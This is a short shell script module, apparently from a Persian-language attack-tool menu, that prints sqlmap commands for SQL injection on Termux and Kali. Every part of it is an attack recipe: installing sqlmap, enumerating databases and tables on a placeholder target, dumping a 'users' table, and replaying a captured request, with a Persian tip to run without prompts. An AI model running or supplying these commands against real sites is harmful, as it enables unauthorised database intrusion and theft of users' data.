DESC="تزریق SQL"
REQ="sqlmap"
RISK="HIGH"
NOTE="--batch بزن تا سؤال نپرسد. --level 2 --risk 2 تعادل خوبی است"

termux(){
cat <<'EOF'
pkg install python
pip install sqlmap
sqlmap -u "https://<TARGET>/page?id=1" --batch --dbs
EOF
}

kali(){
cat <<'EOF'
sqlmap -u "https://<TARGET>/page?id=1" --batch --level 2 --risk 2 --dbs
sqlmap -u "https://<TARGET>/page?id=1" --batch -D dbname --tables
sqlmap -u "https://<TARGET>/page?id=1" --batch -D dbname -T users --dump

# از فایل درخواست (POST و هدر و توکن):
sqlmap -r req.txt -p id --batch --level 3
EOF
}
